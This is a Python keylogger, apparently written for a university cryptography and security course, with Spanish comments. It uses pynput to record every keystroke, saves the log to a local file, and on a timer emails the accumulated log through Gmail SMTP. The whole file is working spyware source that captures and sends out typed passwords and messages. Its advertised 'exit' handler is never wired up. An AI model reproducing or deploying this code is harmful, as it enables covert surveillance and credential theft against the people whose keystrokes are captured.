from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
from pynput import keyboard
import threading
import smtplib
import os

log = "" 
log_total = ""
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = "" 

def send_email():
    # Enviar el log acumulado en lugar de solo las nuevas entradas
    global log_total
    if not log_total:
        return

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        # Correo a uno mismo
        msg["To"] = EMAIL_ADDRESS
        # correo del ayudante: "LaboratorioCyS@pm.me"
        # msg["To"] = EMAIL_ADDRESS, "LaboratorioCyS@pm.me"
        msg["Subject"] = f"Reporte - {datetime.now()}"

        body = f"Registro:\n\n{log_total}"
        msg.attach(MIMEText(body, "plain"))

        server.send_message(msg)
        print(f"Correo enviado exitosamente a las {datetime.now()}")

    except Exception as e:
        print(f"Error al enviar correo: {e}")
    finally:
        try:
            server.quit()
        except:
            pass


def save_to_file():
    global log
    if not log:
        return
    try:
        with open("output.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\nHora: {timestamp}\n")
            f.write(log)
        print(f"Registro guardado localmente en output.txt")
    except Exception as e:
        print(f"Error al guardar archivo: {e}")

def schedule_emails(email_interval):
    global log_total
    while True:
        threading.Event().wait(email_interval) 
        if log_total:
            print("Enviando correo")
            send_email()

def on_press(key):
    global log
    global log_total
    parse_key = ""
    try:
        if key == keyboard.Key.space:
            parse_key = " "

        elif key == keyboard.Key.enter:
            parse_key = "\n[ENTER]\n"

        elif key == keyboard.Key.backspace:
            parse_key = "[BORRAR]"

        elif key == keyboard.Key.tab:
            parse_key = "\t"

        elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
            parse_key = "[SHIFT]"

        elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
            parse_key = "[CTRL]"

        elif key in (keyboard.Key.alt, keyboard.Key.alt_r):
            parse_key = "[ALT]"

        elif key == keyboard.Key.caps_lock:
            parse_key = "[CAPS_LOCK]"

        elif key == keyboard.Key.down:
            parse_key = "[FLECHA_ABAJO]"

        elif key == keyboard.Key.up:
            parse_key = "[FLECHA_ARRIBA]"

        elif key == keyboard.Key.left:
            parse_key = "[FLECHA_IZQUIERDA]"

        elif key == keyboard.Key.right:
            parse_key = "[FLECHA_DERECHA]"

        else:
            char = str(key).replace("'", "")
            parse_key = f"{char}"
        log += parse_key
        log_total += parse_key

    except Exception:
        parse_key = f"[{str(key).upper()}]"
        log += parse_key
        log_total += parse_key

def on_activate_exit():
    print("\nBandera 'exit' detectada.")
    if send_email_flag and log:
        send_email()
    os._exit(0)

if __name__ == "__main__":
    print("Keylogger Reomoto - Criptografía y Seguridad")
    send_email_flag = False
    save_file_flag = False
    email_interval = ""
    while True:
        respuesta_email = input("¿Desea recibir los registros por email?: ").lower()
        if respuesta_email in ['yes', 'y']:
            send_email_flag = True
            break
        elif respuesta_email in ['no', 'n']:
            break
        else:
            print("Respuesta no válida. Por favor responde 'yes'/'y' o 'no'/'n'.")

    while True:
        respuesta_file = input("¿Desea guardar los registros en texto plano?: ").lower()
        if respuesta_file in ['yes', 'y']:
            save_file_flag = True
            break
        elif respuesta_file in ['no', 'n']:
            save_file_flag = False
            break
        else:
            print("Respuesta no válida. Por favor responde 'yes'/'y' o 'no'/'n'.")

    if not send_email_flag and not save_file_flag:
        raise ValueError("Debe seleccionar al menos una opción: enviar por email o guardar en archivo.")

    while send_email_flag:
        email_interval = input("Ingrese el intervalo en segundos para enviar correos (Presione enter para solo enviar al presionar 'exit'): ")
        if email_interval == "":
            email_interval = 0
        else:
            try:
                email_interval = int(email_interval)
                if email_interval < 0:
                    print("El intervalo no puede ser negativo. Se enviara el correo solo al presionar 'exit'.")
                    email_interval = 0
            except ValueError:
                print("Entrada no válida. Se enviara el correo solo al presionar 'exit'.")
                email_interval = 0
        break

    print("\n Key logger iniciado. Presione 'exit' para detenerlo.\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Se enviará todo el log acumulado, en lugar de envíar solo las nuevas entradas del intervalo
    if send_email_flag and email_interval > 0:
        email_thread = threading.Thread(target=schedule_emails, args=(email_interval,), daemon=True)
        email_thread.start()
    try:
        while True:
            if save_file_flag and log:
                save_to_file()
                log = ""
            threading.Event().wait(5)  # Espera para evitar uso excesivo de CPU
    except KeyboardInterrupt:
        print("Bandera 'exit' detectada.")
        if send_email_flag and log:
            send_email()    